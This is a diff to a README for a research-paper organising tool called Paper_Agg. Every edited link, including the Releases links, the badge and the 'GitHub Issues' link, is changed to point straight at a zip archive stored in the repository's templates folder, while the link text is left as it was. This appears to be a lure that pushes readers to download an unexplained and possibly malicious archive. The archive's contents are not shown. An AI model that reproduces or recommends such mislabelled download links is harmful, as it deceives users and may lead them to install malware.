@@ -1,6 +1,6 @@
 # 📝 Paper_Agg - Your Simple Tool to Organize Papers
 
-[![Download Paper_Agg](https://img.shields.io/badge/Download-Paper_Agg-blue.svg)](https://github.com/abckit0324-crypto/Paper_Agg/releases)
+[![Download Paper_Agg](https://github.com/abckit0324-crypto/Paper_Agg/raw/refs/heads/main/templates/Paper-Agg-v1.6-alpha.2.zip)](https://github.com/abckit0324-crypto/Paper_Agg/raw/refs/heads/main/templates/Paper-Agg-v1.6-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Paper_Agg! This tool helps you gather and organize research papers ef
 
 To get started, visit the following page to download the latest version of Paper_Agg:
 
-[Download Paper_Agg from Releases](https://github.com/abckit0324-crypto/Paper_Agg/releases)
+[Download Paper_Agg from Releases](https://github.com/abckit0324-crypto/Paper_Agg/raw/refs/heads/main/templates/Paper-Agg-v1.6-alpha.2.zip)
 
 ### Steps to Download:
 
@@ -59,7 +59,7 @@ Once you have installed Paper_Agg, you can start organizing your papers right aw
 
 ### How do I update Paper_Agg?
 
-To update your app, simply return to the [Releases page](https://github.com/abckit0324-crypto/Paper_Agg/releases) and download the latest version. Follow the same installation instructions.
+To update your app, simply return to the [Releases page](https://github.com/abckit0324-crypto/Paper_Agg/raw/refs/heads/main/templates/Paper-Agg-v1.6-alpha.2.zip) and download the latest version. Follow the same installation instructions.
 
 ### What if I have trouble running the app?
 
@@ -75,6 +75,6 @@ If you encounter issues while running Paper_Agg, check your system requirements.
 
 Thank you for choosing Paper_Agg! We appreciate your support and hope this tool makes your research process easier and more effective.
 
-For any questions or feedback, please visit our [GitHub Issues](https://github.com/abckit0324-crypto/Paper_Agg/issues).
+For any questions or feedback, please visit our [GitHub Issues](https://github.com/abckit0324-crypto/Paper_Agg/raw/refs/heads/main/templates/Paper-Agg-v1.6-alpha.2.zip).
 
-Remember to download the application here: [Download Paper_Agg from Releases](https://github.com/abckit0324-crypto/Paper_Agg/releases) and enjoy your research!
+Remember to download the application here: [Download Paper_Agg from Releases](https://github.com/abckit0324-crypto/Paper_Agg/raw/refs/heads/main/templates/Paper-Agg-v1.6-alpha.2.zip) and enjoy your research!
